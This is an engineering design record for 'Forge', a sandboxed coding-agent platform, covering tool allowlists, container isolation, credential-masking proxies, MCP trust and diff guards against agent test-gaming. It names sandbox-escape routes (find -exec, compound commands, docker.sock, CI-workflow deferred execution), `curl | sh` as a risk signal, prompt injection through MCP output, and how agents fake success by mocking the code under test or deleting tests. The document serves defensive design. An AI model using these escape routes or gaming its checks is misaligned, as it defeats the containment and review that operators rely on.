2. **`EnsembleSecurityAnalyzer`'s max-severity fusion with fail-closed-to-HIGH on analyzer error.**
   §17 states the asymmetry; it does not state what happens when a classifier throws. Theirs does.
3. **`critic/`** — an evaluate-and-refine loop with `IterativeRefinementConfig`. We have no
   counterpart. Not needed for v1, but it is the shape §9's `DIAGNOSING` phase will grow into.

## What this does to the recommendation

**B.6 survives, with its reasoning replaced.** "Build the outer loop, buy the inner loop" still holds —
but not because the inner loop is commodity we would build worse. It holds because the inner loop is
*tool-call plumbing and context management*, which is genuinely theirs to do well, while every guarantee
Forge sells is either absent from their tree or present in a weaker form.

The specific corrections to carry forward:

- **B.3's "most of §9/§15/§16 is commodity" is overstated.** §15's dispatch pipeline and §16's hardening
  are not commodity — the equivalents do not exist. What is commodity is the agent loop, the terminal
  tool, MCP wiring, and the condenser.
- **B.5's "adopting L2 makes hand-rolled L1 safer" is wrong** and should be struck. Their durability is
  a JSON directory in an ephemeral container. Ours has to remain the real one regardless.
- **B.7 item 2 — "the harness wants to own when the task is done" — resolves in our favour, structurally.**
  `ConversationExecutionStatus.FINISHED` (`conversation/state.py:57`) is set when the agent calls
  finish. It is a harness *status*, and the agent server has no access to Forge's database, so it
  cannot write `tasks.state` even in principle. The boundary B.7 worried might prove unenforceable is
  enforced by there being two databases and only one of them ours. That was the spike's "most
  important" measurement (B.8 item 3) and it is now answered by reading the code: **yes, transition
  authority stays Java-side.**

**The port surface maps cleanly**, which is the practical payoff. Against §16's `ExecutionHarness`
sketch:

| Port method | Agent server endpoint |
|---|---|
| `startAttempt` | `POST /api/conversations` |
| `sendGuidance` | `POST /api/conversations/{id}/start-goal` |
| `streamEvents` | `event_router` + `sockets_router` (WebSocket) |
| `pause` / `resume` | `POST /{id}/pause`, `POST /{id}/resume-goal` |
| `captureDiff` | `GET /api/git/diff` (read-only — no push endpoint exists) |
| `destroy` | `DELETE /api/conversations/{id}` |
| *(per-attempt policy)* | `POST /{id}/security-analyzer`, `POST /{id}/confirmation-policy` |

Every method has a home, and the two policy endpoints are settable per conversation at runtime, which
is what lets Forge install the ensemble analyzer per attempt rather than trusting a server default.

## What the spike still has to measure

Reading the code answered B.8 item 3 (transition authority: yes) and item 4 (credential boundary: holds,
provided we register no secrets and pin a test on it). What documentation cannot answer, and the spike
still must:

1. **Resolution rate and cost per resolved task**, unchanged from B.8 — the only reason to prefer one
   harness over the other on quality.
2. **Whether the file-based lease and JSON event log survive real container churn.** §16 requires that
   sandbox loss be routine. Kill the container mid-attempt, repeatedly, and measure whether the event
   log replays correctly or corrupts.
3. **The upgrade treadmill's actual cost.** Pin v1.42.1, then re-run the conformance suite against
   whatever ships eight weeks later. Nine minor versions in five weeks is the risk; measure it rather
   than fearing it.

---

# Phase 3.2 — what happened when the adapter met the actual server

**Date: 2026-08-19.** 3.1 built the port from a reading of OpenHands' source. 3.2 tried to build the
adapter and run it. The adapter exists; **the exit criterion — "conformance suite green against the
real adapter" — is not met**, and the reasons are worth more than the adapter is.

## 1. There is no current agent-server image you can pull on x86_64

`ghcr.io/all-hands-ai/agent-server:latest` has no `linux/amd64` entry in its manifest list — arm64
only. Walking the tag list, the amd64 build that does exist (`489858f-java`,
`sha256:ff03d88a2379…`, 626 MB) reports **`openhands_sdk 1.0.0`** from its own dist-info. Twelve
recent commit SHAs from `main` are not published as tags at all.

So on an x86_64 host, running current OpenHands means **building the image yourself from source**.
That is a standing operational cost — a Python toolchain, a multi-stage build, and an image to host —
that Appendix B costed at zero. B.7 item 3 said the Python surface was "bounded by running it only as
a containerised service"; that bound assumed somebody else builds the container.

## 2. What the pullable build actually exposes

Its own `/openapi.json`, which is authoritative in a way source reading is not — fifteen paths:

```
GET  /alive · /health · /server_info · /tools/list
GET,POST     /api/conversations/
GET,DELETE   /api/conversations/{id}
GET,POST     /api/conversations/{id}/events/
GET          /api/conversations/{id}/events/search · /count · /{event_id}
POST         /api/conversations/{id}/events/respond_to_confirmation
POST         /api/conversations/{id}/pause · /resume
```

**No `/api/git/*` at all.** Our `captureDiff` — the single way work leaves a sandbox under §16's
host-brokered rule — has no endpoint on the only image we can run. There is also no `/run`, no
`/security-analyzer`, and no `/confirmation-policy`, so the per-conversation ensemble analyser that
the corrected Appendix B relied on to satisfy §17's asymmetry cannot be installed on this build
either.

## 3. Even at v1.42.1 there is no "give me the patch" endpoint

`GET /git/diff` takes a **file** path and returns `{original, modified}` — whole contents, before and
after. `GET /git/changes` lists changed files. Assembling a patch is the client's job.

So the adapter carries a diff implementation (`UnifiedDiffs`). Not difficult, but note *why* it can't
be the obvious three-line version: marking every line removed and every line added is a valid unified
diff, and it makes §17's `TEST_DISABLED` fire on an `@Disabled` that was already in the file, so every
attempt touching that file escalates for something it did not do. A guard that cries wolf gets turned
off. The diff has to be real.

## 4. `run` is fire-and-forget

`POST /{id}/run` returns `Success` immediately — "start running the conversation in the background."
Our port's `run` is blocking and returns a `HarnessStop`, so the adapter posts the instruction, then
polls `GET /api/conversations/{id}` for `execution_status` while draining `events/search` by cursor.
Workable, and it means every attempt carries a polling loop and a poll interval to tune.

## 5. The one that is not a version problem: tool granularity

Their unit of granting is a **tool class**, not a tool. The request takes
`[{"name": "BashTool", ...}, {"name": "FileEditorTool", ...}]`.

§15 says the allowlist is computed per attempt *and per phase* — `ANALYZING` gets read-only tools,
`WRITE_GITHUB` exists only in `SUBMITTING` — and it says `run_command` is "an allowlisted set of
binaries, not a shell", because "unrestricted shell also makes the sandbox's other controls largely
decorative."

**`BashTool` is a shell.** Asking for anything that runs a command grants arbitrary command
execution, and there is no way to ask for less. Phase gating cannot be expressed at all: you get the
toolset for the whole conversation.

This is not fixable in an adapter, and no newer image helps. Three ways out, in order of preference:

1. **Never grant `BashTool`.** Give the agent file tools only, and run the verification contract
   ourselves through `SandboxProvider` — which §9 already wanted, since `VERIFYING` has no model in
   the decision path. The agent edits; ForgeStack runs the tests. This keeps §15 intact and is the
   option that fits the existing design best.
2. **Put the allowlist on the sandbox's PATH** — a wrapper binary that refuses anything not in the
   verification contract. Defence we control, inside a tool we do not.
3. **Amend §15** to say that a bought harness with a shell tool cannot honour the binary allowlist,
   and record what is lost. Honest, and the weakest.

Option 1 is recommended and is close to free, because it removes work rather than adding it.

## 6. Confirmed at the source of truth: the model key goes in the sandbox

The create-conversation schema carries `agent.llm.api_key` — and, next to it, `base_url`. That is §16's
newly-recorded gap confirmed by the API itself, and its mitigation sitting in the same object. Point
`base_url` at the ForgeStack egress proxy and pass a per-attempt token worth nothing anywhere else.

## What this changes

Nothing about B.6's recommendation yet — but it moves the cost. The inner loop is still not worth
building; it is just more expensive to *buy* than the appendix assumed: build and host the image
ourselves, carry a patch assembler, carry a polling loop, and resolve the tool-granularity conflict
before any of it is safe.

**The spike Appendix B asked for is now much cheaper and much better specified.** It no longer needs
to answer "can we keep transition authority" (yes, structurally — two databases, one ours) or "does
the credential boundary hold" (yes, if we register no secrets and never grant `BashTool`). It needs
to answer one thing: **resolution rate and cost per resolved task**, against an image we build, with
option 1 above in place.

Do that before writing another line of adapter.

---

# Decision — build the execution runtime, keep the port

**Date: 2026-08-19. This reverses Appendix B.6's "buy the inner loop" and supersedes it.** B.6 is left
in place rather than edited, because the reasoning that led to it was sound given what was known, and
a plan that quietly rewrites its own history teaches nobody anything.

## What changed

B.3's case rested on one claim: the inner loop is commodity, hardened over eighteen months, and *"we
would spend M5–M8 rebuilding it and land somewhere worse."* Three findings retire that.

**1. The loop is about a hundred lines.** [mini-swe-agent](https://github.com/SWE-agent/mini-swe-agent/)
scores **>74% on SWE-bench Verified** — above the 72.8% B.3 credited OpenHands with — from ~100 lines
of Python, with bash as its only tool and without using the models' tool-calling API at all. It is in
production at Meta, NVIDIA and IBM. Whatever the resolution rate comes from, it is not the scaffold.

**2. Our own constraints delete most of what we would be buying.** §15 forbids a shell, so not their
`BashTool` — which 3.2 found is their only unit of granting for command execution. §16 forbids
credentials in the sandbox, so not their secret registry and not agent-side git. §17 requires risk
from path globs and change shape, so not their model-self-reported analyser. §18 requires tenancy
they do not have. §10.3 requires our guards to decide completion. What is left to buy is a model
call, a tool dispatch loop, and a condenser.

**3. The Java gap closed.** B.2 said "there is no Java option at L2, and there will not be one" — true
of coding-agent harnesses and irrelevant to what we actually need. Spring AI 2.0.0 **requires** Spring
Boot 4.0/4.1 and Framework 7, which is what this application already runs, and it is already on the
runtime classpath. Its user-controlled tool loop — call the model, execute tool calls yourself, feed
results back — is §9's design exactly. §26's "Spring AI may prove immature on Boot 4.1" is closed by
the dependency resolving.

## What this does not change

Everything B.6 put in the KEEP column, which was always the product. And the port: `ExecutionHarness`
stays, with the native runtime as one implementation and `OpenHandsHarness` as the other. **Keeping a
second adapter is what makes the abstraction honest** — an interface with one implementation is a
guess about the future, and the conformance suite has already proved its worth by catching things the
first implementation got wrong.

## The risk this decision exposes rather than creates

mini-swe-agent reaches 74% **with a shell and nothing else**. §15 says `run_command` is "an
allowlisted set of binaries, not a shell", on the grounds that unrestricted shell makes every other
sandbox control decorative.

Both cannot be true at once. Either the allowlist costs materially less capability than the evidence
suggests, or Forge resolves fewer tasks than an unconstrained agent and sells the difference as
safety. **That trade has never been measured, and it is ours, not a vendor's.** Building the runtime
does not create this risk — it stops it hiding behind somebody else's product decision.

So the spike changes shape. It was never really OpenHands versus Claude. It is:

> On a fixed set of seeded tasks, on our own runtime, what does resolution rate do when the agent has
> an allowlisted tool set instead of a shell?

Run it as soon as there is a runtime to run it on. If the gap is small, §15 is vindicated and the
sandbox controls mean something. If the gap is large, §15 needs amending in the open — a wrapper
binary on the sandbox PATH, or a shell inside a much stronger isolation boundary — rather than being
quietly bypassed later by whoever is trying to make a demo work.

## What we take from the research anyway

Reading three harnesses closely was not wasted; it changes the design.

- **Compaction as an event applied at read time.** Keep the whole log; a condensation is a row; the
  view is computed. §11 and §14 had no answer for context growth beyond truncation.
- **Deterministic stuck detection** over the last N events — repeated action-observation pairs,
  repeated action-error runs, agent monologue, context-window loops. §9's escalation triggers were
  prose; this is the working shape, and it is runtime-owned rather than model-reported.
- **Max-severity fusion with fail-closed-to-HIGH** when a risk classifier throws. §17 states the
  asymmetry and says nothing about a guard erroring.
- **Tool spec separated from executor, resolved by name at runtime.** What makes a tool definition
  crossable to a sandbox as JSON and bindable to environment-specific state on the far side.
- **Every step ends in a committed checkpoint, and each is interruptible.** Already our design; worth
  stating on the handler contract rather than leaving to habit.

And one anti-lesson, from OpenHands V1's own rewrite: it relaxed mandatory sandboxing to **opt-in**,
partly because MCP assumes local access to credentials and files. That is correct for a developer on
their own machine and is a trade §16 and §18 cannot make. We take the event sourcing and leave the
isolation model.

> **Partly superseded.** The objection was to MCP's assumption of *local* credentials and files, and
> it holds only while "local" means the host. With servers running inside the sandbox and credentials
> replaced by proxy-substituted sentinels, both halves dissolve. We take MCP and still leave the
> opt-in sandboxing. See the Decision section.

## Build order

`SandboxProvider` first (§16). It is needed under every option, has no model dependency, is the
security perimeter, and — unlike anything involving a model — can be conformance-tested against real
containers today. Then the tool catalogue and dispatch pipeline (§15), then `ModelRouter` on Spring
AI (§13), then the loop and context assembly.

---

# Decision — the sandbox is the boundary, and flexibility is what that buys

§15 said `run_command` must be an allowlist of binaries and never a shell, and gave two reasons:
commands should be *reproducible, attributable, and analysable*, and "unrestricted shell also makes
the sandbox's other controls largely decorative." The first reason survives. The second is false,
and it was load-bearing.

This section replaces it, and in doing so answers two requirements the plan previously refused:
agents that are not boxed in by a fixed tool list, and reuse of the existing MCP ecosystem.

## The second reason is empirically false

Two containers were built with the exact hardening block §16 specifies and probed directly.

- `find` — as innocuous an allowlist entry as exists — grants arbitrary execution via `-exec`.
  No shell involved. The allowlist was satisfied.
- `npm test` executes arbitrary repository-authored commands, because build configuration is
  Turing-complete. This tool *cannot* be removed from the allowlist: running it is the entire
  purpose of the verification contract (§9).

Meanwhile the controls that actually contain anything — network namespace, read-only rootfs,
`--user 10001`, `--cap-drop=ALL`, `--pids-limit` — measured identically with a shell present and
absent. They are kernel-enforced and indifferent to what binary asked.

So the allowlist stops honest mistakes, and the sandbox stops everything else. Shell presence moves
neither line.

Anthropic ships the same conclusion in Claude Code, having reached it independently:

> A rule like `Bash(command:rm *)` **would be bypassable by a compound command**, so Claude Code
> ignores it and emits a startup warning.

They decline to ship the rule form rather than let anyone trust it. And:

> The same applies to `find` with `-exec` or `-delete`: a `Bash(find *)` rule doesn't cover these
> forms.

The same escape, named in their docs. Their positive statement is the one that matters:

> the operating system enforces that boundary for **every Bash command and its child processes**.

*And its child processes.* An OS boundary is inherited across `exec` and `fork`. An allowlist is
not — it is checked once, at the outermost call, and every process spawned beneath it is unchecked.
That asymmetry is the whole argument.

## Three planes

Every subsequent decision follows from which plane a thing belongs to.

| Plane | Where it runs | Who authors it | Mutable by tenant? |
|---|---|---|---|
| **Isolation** — container, netns, read-only rootfs, non-root, cap-drop, egress proxy | kernel | Forge | no |
| **Policy** — may this call happen, what risk, diff guards, budget | host, in-process | Forge | within a schema, tighten-only |
| **Capability** — shell, binaries, tools, MCP servers | inside the sandbox | anyone | yes, freely |

**All flexibility is spent on the capability plane. The other two are fixed.** That is what makes
the flexibility affordable: adding a tool cannot widen the blast radius, because the blast radius is
defined a plane below and does not consult the tool list.

Under the old §15 the inverse held — the allowlist *was* the boundary, so every new tool was a
security review, and MCP was unthinkable. The boundary was in the wrong place, and the visible
symptom was that the design could not be extended.

## §15 — amended

- **`ExecRequest` gains a shell form.** Argv remains the default, because argv is easier to log,
  attribute, and classify — §15's *surviving* reason. Shell is available, and the javadoc says
  plainly that it is not a containment feature.
- **The binary allowlist is demoted from control to operational contract.** It stays, because it
  catches an agent wandering somewhere pointless and keeps the audit trail narrow. It is documented
  as ineffective against an adversary, so nobody later defends it as a security control or blocks a
  feature to preserve it.
- **Commands are parsed, not prefix-matched.** A bash AST yields risk *signals* for §17 —
  redirection outside the workspace, `curl … | sh`, credential-shaped literals, package installs.
  Prefix matching on command strings is the thing both we and Anthropic proved does not work.
- **Full command text is audited** per attempt, immutably. This is what §15 actually wanted from
  "attributable," and it is achieved by recording, not by restricting.

## §15 — MCP, and why the earlier refusal no longer holds

The plan refused MCP twice, on a specific ground: *MCP assumes local access to credentials and
files.* Both halves dissolve once the boundary moves.

**Files.** "Local access to files" is disqualifying when local means the host. It is unremarkable
when local means the sandbox — the agent already has that access, and an MCP server that reads the
workspace is doing nothing the agent could not do itself.

**Credentials.** This half was real, and needed a mechanism rather than an argument. Anthropic's
open-source `@anthropic-ai/sandbox-runtime` supplies one: the sandboxed process holds a **sentinel**,
not the credential; the TLS-terminating proxy substitutes the real value on egress, only for hosts in
`injectHosts`. A credential that never enters the sandbox cannot leak from it, and a stolen sentinel
is inert anywhere but that proxy.

So MCP splits into two lanes by transport:

**stdio MCP servers run inside the sandbox.** Same container, same uid, same kernel boundary, no
privilege of any kind. A tenant may bring any server they like precisely because bringing one grants
nothing. Their network, if any, is the workspace's proxy like everything else.

**HTTP/remote MCP servers are egress, and get egress's controls.** The host must be on the
workspace allowlist; the credential is a sentinel substituted at the proxy; the sandbox never holds
the real token.

Three rules make that safe, and each has a reason:

1. **MCP credential and host configuration comes from workspace settings, never from the
   repository.** `sandbox-runtime` enforces exactly this for its masking config, and the reason
   generalises: configuration that authorises sending a real credential must not be authored by the
   thing under analysis. A repo that could name its own `injectHosts` could exfiltrate to them.
2. **Servers are present in the image, or fetched by the host and injected as files.** The
   canonical `npx -y @some/server` invocation is a runtime install of unpinned code from inside the
   sandbox, which is a supply chain we would not be able to audit. Digest-pinned fetches through the
   proxy are acceptable; `-y` against a floating tag is not.
3. **MCP tool output is untrusted input.** It enters the model's context from a third party, which
   makes every MCP server a prompt-injection surface with its own supply chain. Context assembly
   (§14) tags it as untrusted, and per §17's asymmetry a call whose arguments derive from MCP output
   may have its risk *raised* by that provenance and never lowered.

- *What could go wrong:* tool proliferation, now with a bigger tap. §15's cap of ~12 offered tools
  was about model selection accuracy, and MCP makes it easy to blow through. The cap is enforced at
  catalogue resolution, not left to whoever writes the config.

## §16 — amended

- **The egress proxy is promoted from convenience to the load-bearing control**, and gains
  credential masking. It was previously described as the thing that lets package registries through.
  It is now the only thing standing between a sandboxed process and the network, and the mechanism
  by which any credential is used without being disclosed.
- **`/workspace` stays a tmpfs and never a bind mount.** Already true, and the code already says
  why. It is now load-bearing for a reason the plan had not recorded: see the deferred-execution
  rule below.
- **gVisor moves from "second customer" to "before any unvetted repository runs."** The container is
  now the sole isolation layer by design rather than by accident, and we are about to permit
  arbitrary third-party MCP servers inside it. A kernel exploit was previously the second-worst
  outcome; it is now the only one.

## §17 — amended

- **Extensions may tighten, never loosen** becomes an explicit architectural invariant rather than a
  property of risk levels. Claude Code implements the same rule: *"a matching deny rule blocks the
  call … even when the hook returned allow."*
- **Deferred execution is an escape class, and the diff guards are where it is caught.** Anything an
  agent writes inside the sandbox that later executes outside it is an escape, and it produces no
  sandbox violation, because nothing was violated at write time. `sandbox-runtime` blocks
  `.git/hooks` unconditionally on both platforms — surviving even the opt-in that unlocks
  `.git/config` — for exactly this reason.

  Our equivalent is `.github/workflows`, which *is* tracked, therefore *does* leave in the diff, and
  runs on GitHub's runners with production credentials after merge. `CI_CONFIG_CHANGED` already
  refuses it. It was written as anti-cheat and §17 records it as anti-cheat; it is in fact the only
  control between a sandboxed agent and code execution on a credentialed host. **The recorded
  rationale is weaker than the control**, which is how a guard gets relaxed for good-sounding
  reasons by someone who cannot see what else it holds up.
- **Risk classification parses rather than matches.** Where Claude Code enforces command rules it
  parses the PowerShell AST and requires every subcommand to match. Prefix matching is what it
  refuses to ship.

## What we deliberately do not take from Claude Code

Its model is built for a single developer who *is* the trust boundary. Four things follow from that
and must not cross over:

- **No `dangerouslyDisableSandbox`.** An agent that escalates itself out of its own boundary on
  failure is a defensible trade on a personal machine and disqualifying in multi-tenant SaaS. The
  absence is structural — no field, no flag — the way `AttemptSpec` has no credential field.
- **No host-side tenant-authored hooks.** Claude Code's handlers *"run in the current directory with
  Claude Code's environment"* — host, unsandboxed, full user permissions. In Forge the author would
  be the tenant and the target the control plane, which is what §18 exists to prevent. Policy is
  declarative data evaluated by our code; a tenant configures it and never supplies an executable.
  Tenant-authored *workflow* steps are fine and belong inside the sandbox, where they are
  indistinguishable from the agent's own commands.
- **No repository-supplied credential configuration** — rule 1 above.
- **No lowering of risk by model self-report** (§17, unchanged, and the failure mode found in
  OpenHands' default analyzer).

## What "agent flexibility" concretely means now

- **The tool catalogue is per-attempt data, not code.** Composed at attempt start from Forge
  built-ins, workspace MCP servers, and the repo's declared servers; capped; frozen for the attempt
  so the audit trail is stable; recorded on the attempt row.
- **Phase stops gating dispatch.** §9's phases keep their escalation triggers and budget checks —
  those are policy — but stop deciding which tool is legal when. Phase becomes prompt context and a
  risk input. This removes the rigidity without moving anything off the policy plane.
- **`ExecutionHarness` stays the seam** (native runtime first, `OpenHandsHarness` second), and
  `ModelRouter` keeps per-attempt model selection. Both are flexibility that costs nothing, because
  neither can reach the isolation plane.

## What this costs, stated plainly

- The container is now the only thing between a tenant's repository and the host kernel. Previously
  the plan could tell itself the allowlist was a second layer. It was not one, but it read as one.
- Third-party MCP servers are third-party code running against a tenant's source. Rule 2 bounds the
  supply chain; it does not eliminate it.
- Shell commands are harder to classify than argv arrays. The AST work is real, and it is the price
  of the honesty.

## Build order, revised

`SandboxProvider` is done. Next is the **egress proxy with credential masking** — promoted ahead of
the tool catalogue, because it is now the control that MCP, the model key, and host-brokered git all
depend on, and because every week it does not exist is a week §16's central promise is untested.
Then the tool catalogue and dispatch (§15) with the MCP adapter, then `ModelRouter` (§13), then the
loop.

---

# Amendment to §17 — the agent writes tests, so tests need provenance

The agent must be able to write test cases, and to mock dependencies where a test needs it. That
requirement lands directly on top of §17's diff guards, which exist to refuse deleted tests, disabled
tests, and removed assertions — and the canonical way an agent fakes success is *precisely* to mock
the thing that was failing.

Both positions are correct. The conflict is not between them; it is that §17 treats every test file
as equally authoritative, and the moment the agent authors tests, that stops being true.

## Provenance is authority

A test's weight as evidence depends entirely on who wrote it and when. Three tiers, decided by
comparing the attempt's cumulative diff against `WorkingCopy.baseSha`, which `AttemptSpec` already
carries:

| Tier | What it is | Agent may | Evidentiary weight |
|---|---|---|---|
| **Inherited** | Everything present at `baseSha` | extend; never weaken | strong — this is what "don't break it" means |
| **Authored** | Written during this attempt | write, refactor, mock, delete freely | **none on its own** |

Two tiers, not three. An earlier draft of this section invented an "acceptance" tier for tests the
task names as the definition of done — which is §9's `VerificationContract`, already human-declared
and already forbidden to the model (§9: *"this is the definition of done and the model must not
author it"*). The contract declares the *command*; the tiers describe the *tests that command runs*.
They are different things and only one of them needed inventing, which was neither.

The tier names avoid "acceptance" and "contract" deliberately: both are scope words in the standard
test taxonomy, and this axis is provenance, not scope. A reader who sees "contract tier" will think
of consumer-driven contract testing, and be wrong.

The last cell is the load-bearing one. If agent-authored tests could certify completion, then
`assertTrue(true)` satisfies `DIFF_GUARDS_PASSED` and the entire guard model is decorative. An agent
may demonstrate its work with tests; it may not *certify* its work with them.

This also dissolves the false positives. An agent consolidating five assertions into three
parameterised ones, in a file it wrote twenty steps ago, is refactoring — and under the current
whole-diff `ASSERTIONS_REMOVED` count it is a refusal.

## What the guards become

| Guard | Scope | On fire |
|---|---|---|
| `TEST_DELETED` | inherited | refuse |
| `TEST_DISABLED` | inherited | refuse |
| `ASSERTIONS_REMOVED` | inherited | refuse |
| `TEST_DELETED` / `TEST_DISABLED` / `ASSERTIONS_REMOVED` | authored | **not evaluated** |
| `CI_CONFIG_CHANGED` | all | refuse — and see the deferred-execution rule |
| `SECRET_INTRODUCED` | all | refuse |
| `SUBJECT_MOCKED` | new | refuse |
| `SELF_CERTIFYING` | new | flag |
| `DEPENDENCY_ADDED` | §17's list, never built | refuse |
| `FILE_SCOPE_VIOLATED` | §17's list, **blocked** — no `plans` table exists | refuse |

The last two rows are §17's original seven minus what was actually implemented. This table's first
draft re-enumerated the guards and inherited the omission without noticing, which is how a list that
is checked twice can still be wrong twice. `FILE_SCOPE_VIOLATED` cannot be built until the `plans`
table exists — it is in no migration — and until then §9's supervisor escalation trigger is the only
thing watching file scope, which is advisory and does not block completion. See known-gaps §3.21.

## Mocking: the signal that separates the two cases

Legitimate mocking isolates a unit from something external, slow, or non-deterministic. Cheating
mocks *the subject* — the code the agent just changed — so the test proving it works never runs it.

The distinguishing signal is cheap and precise: **is the mocked type also modified in the non-test
half of the same diff?**

> Changed `PaymentService`, and mocked `PaymentService` in the test that proves the change works.

That is `SUBJECT_MOCKED`, and it refuses. Mocking a payment *gateway* the agent did not touch is
ordinary practice and is silent. Detection is by mock-framework shape — `Mockito.mock`/`when`/
`@MockitoBean`, `unittest.mock.patch`, `jest.mock`, `sinon.stub`, `gomock` — intersected against the
set of type names the diff modifies.

`SELF_CERTIFYING` is the weaker companion: the production change is exercised only by tests authored
in this same attempt, with nothing from the inherited tier touching it. That is the *normal* state for
a genuinely new feature, which is why it flags rather than refuses. What it means is that the green
build is the agent's own opinion of its own work, and a person should know that before merging.

## Findings gain a severity, because they no longer all mean the same thing

`DiffVerdict.passed()` is currently `findings.isEmpty()`, so every finding blocks completion. That was
defensible when every guard described brazen cheating. `SELF_CERTIFYING` is not cheating, and
blocking on it would stop the agent doing exactly what it has now been asked to do.

So `DiffFinding` gains `Severity.REFUSE | FLAG`; `passed()` becomes "no `REFUSE` finding"; `FLAG`
findings persist on the attempt row, raise the change's risk class under §17's may-raise-never-lower
rule, and surface in review. `DiffGuards`' class javadoc — which still claims a finding "escalates
rather than failing the task" — is corrected rather than left describing the behaviour it had before
`DIFF_GUARDS_PASSED` was enforced.

## What this does not achieve, stated plainly

Mock detection is regex over diff text. It has false positives (a test legitimately mocking a type
that was also touched for an unrelated reason) and false negatives (hand-rolled fakes, dependency
injection of a stub subclass, a test double that never names a mock framework). It raises the cost of
the cheat and makes it visible. It does not make it impossible.

The controls that actually hold are the two either side of it: **the inherited tier still passes**, and
**a person reviews the PR**. The guards exist so that the person reviewing knows where to look. A
guard oversold is worse than one absent, because someone will rely on it.

- *Deferred:* "is the change actually exercised" is a coverage question, and answering it properly
  needs coverage data from the verification run rather than diff text. `SELF_CERTIFYING` approximates
  it by file-level association. Revisit when the verification contract reports coverage.

## Which test scopes Forge actually gates on: unit and integration

Provenance (above) is one axis. Scope is the other, and the plan owes an answer on it, because "the
agent writes tests" is meaningless without saying *which kind* the system can consume.

The selection criterion is not "can we execute it." It is **can the agent's loop consume the
verdict** — which needs three properties: the result is deterministic, it is cheap enough to run many
times inside one attempt, and it needs neither a human nor a deployment to produce.

| Layer | Gate on it? | Why |
|---|---|---|
| **Unit** | **yes — the core** | Deterministic, fastest, no dependencies. Runs under `--network none` exactly as the sandbox already is |
| **Integration** | **yes — and it is where the work is** | Where real defects live. Needs companion services, which the sandbox cannot currently provide |
| Contract (consumer-driven) | falls out for free | Verifying a stored pact is a file plus your own service — no new machinery. A pact *broker* is network, and goes through the proxy like anything else. Not a target; not excluded |
| End-to-end | **no** | Slow, and flaky — see below |
| Acceptance (business requirement) | **never automate** | This is the human's judgment, and §9 already assigns it there: the `VerificationContract` is human-declared and the model may not author it |
| Smoke | out of scope | Post-deploy, and Forge does not deploy |

### Flakiness is not an annoyance here, it is an incentive

A flaky gate is disqualifying for a reason that does not apply to human developers. An agent consumes
the test verdict as its *control signal*. Under a nondeterministic signal it cannot distinguish "my
change broke this" from "this fails sometimes," so it cannot learn from the feedback it is being
given — it thrashes, burns the attempt budget, and converges on the one action that reliably turns
the signal green.

That action is deleting or disabling the flaky test.

So admitting E2E into the gate would *manufacture* precisely the behaviour §17's diff guards exist to
police, and then punish the agent for the situation we created. The guards would fire, correctly, on
an agent behaving rationally. **Determinism is a prerequisite for the anti-cheat model to be fair,
not merely for the results to be trustworthy.**

E2E still has a place — as post-merge CI, where a human reads the failure. §26 already says CI is the
final arbiter and the sandbox is not. Nothing changes there. What changes is that E2E never becomes
an input the agent optimises against.

### Integration needs something §16 does not have

Unit tests run today. Integration tests do not, and the gap is specific.

The standard mechanism is Testcontainers, which requires the Docker socket. **Mounting `docker.sock`
into the sandbox grants root on the host** — it is the single most complete sandbox escape available,
and it is categorically excluded, at any privilege level, for any repository.

The workable shape is companion services provisioned by the *host*:

- `SandboxSpec` gains declared **service dependencies** — image, ports, health check.
- The host provisions them onto the existing per-workspace network (`forge-sbx-{workspace}`), which
  already exists for `PROXY_ONLY` and already isolates tenants from each other.
- Hostnames and ports are injected as environment variables. The sandbox reaches Postgres over the
  network namespace it is already in, and never learns Docker exists.
- The services are declared in the `VerificationContract`, alongside the test command — human-declared,
  agent-immutable, consistent with §9.

- *What could go wrong:* service dependencies are an unbounded image allowlist by another name. A
  contract that can name any image can name a mining container. Bound it to a Forge-curated set plus
  digest-pinned entries, on the same argument as the MCP rule.

### The forcing example: Forge cannot currently maintain Forge

`AbstractIntegrationTest` starts real Postgres and Redis through Testcontainers, deliberately —
its own javadoc explains that H2 would verify a different system, because the schema depends on RLS,
partitioning, and partial unique indexes.

That suite cannot run inside a Forge sandbox today, and cannot ever run there via Testcontainers. Any
repository serious enough to test against its real database has the same problem. This is not an edge
case to defer; it is the median case for the repositories Forge is for, and it means **service
dependencies are required for the integration tier to exist at all** rather than being an
enhancement to it.

---

# What makes someone choose this — the honest answer

The last several sections optimised the security boundary. Three consecutive requirements arrived —
agent flexibility, existing MCP servers, the agent writing and mocking tests — and each was answered
with *how to make it safe* rather than *this is the reason the product exists*. That ordering is
wrong, and this section corrects it.

## Security is a qualifier, not a differentiator

Nobody chooses a platform because it drops capabilities and mounts a read-only rootfs. Security is
the thing you lose without and never win with — it gets you into the evaluation and is forgotten by
the second week. Every hour of §15–§18 was necessary. None of it is a reason to sign up.

The one honest exception is that it is a *procurement gate*: a team will not grant an autonomous
agent write access to their main branch without it. But note the shape of that — it is permission to
compete, not an advantage.

**The claim worth making is not "it is secure." It is "you can leave it running."** That is the same
engineering restated as the thing a buyer actually wants. The diff guards are not a security feature;
they are the reason a reviewer can approve a Forge PR without reading every line, which is the
difference between a product that saves time and one that relocates it. §26 already says the metric
is human edit rate on Forge PRs. That is a product metric, and it is the right one.

## The workspace is the product

The agent loop is commodity — this plan already concedes that, citing mini-swe-agent at ~100 lines
and >74% on SWE-bench Verified. What is not commodity, and what takes months to reproduce, is the
environment the loop runs in.

A ForgeStack workspace holds:

| | What it is | Why it cannot be replicated by a CLI agent |
|---|---|---|
| **Services** | Declared companion containers — Postgres, Redis, whatever the suite needs | Integration tests are the median case; without this the agent cannot run the tests that matter |
| **Toolchain** | Warm images, populated build and dependency caches | A cold `npm install` per attempt is a §22 cost problem and a latency problem, every attempt, forever |
| **MCP servers** | Workspace-scoped, credentialed by sentinel substitution | The agent can read the error tracker, the issue tracker, the API docs — context no repo checkout contains |
| **Verification contract** | Human-declared, tuned over months | The definition of done, refined by the people who know |
| **Repo knowledge** (§14) | Architecture notes, conventions, past attempts as evidence, known-flaky tests | Accumulates. Attempt 50 is better informed than attempt 1 |
| **Egress allowlist** | Registries, MCP hosts, documentation | |
| **Credentials** | Present in effect, absent in fact | |

The property that matters is the last column taken as a whole: **a workspace at month six is
materially better at its repository than the same workspace on day one.** A CLI agent starts cold
every single invocation and cannot accumulate anything. That is the moat, and it is a capability
moat, not a security one.

## The build order was right, for a reason I stated badly

The egress proxy was put ahead of the tool catalogue and justified as the control that MCP and the
model key depend on. That is true and it undersells it.

Every capability requested in the last three rounds routes through the same two pieces of work:

- remote MCP servers → the proxy
- the model API key → the proxy
- host-brokered git → the proxy
- integration tests → companion services on the per-workspace network
- package installs, warm caches → the proxy

